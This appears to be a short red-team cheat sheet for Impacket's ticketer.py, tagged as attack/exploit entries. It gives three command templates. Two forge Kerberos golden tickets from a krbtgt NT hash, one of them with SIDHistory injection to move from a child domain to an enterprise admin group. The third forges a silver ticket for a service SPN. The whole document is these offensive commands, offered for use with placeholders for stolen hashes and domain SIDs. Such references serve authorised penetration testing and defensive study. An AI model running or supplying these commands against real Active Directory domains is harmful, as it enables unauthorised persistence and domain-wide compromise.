# ticketer (imp)

% impacket-kerberos, windows, kerberos, 88

## Ticketer - (golden ticket) - 
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - (golden ticket) - SIDHistory injection
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_somain_sid> -extra-sid <ets_admin_sid> -domain <child_domain> <user>
```

## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```
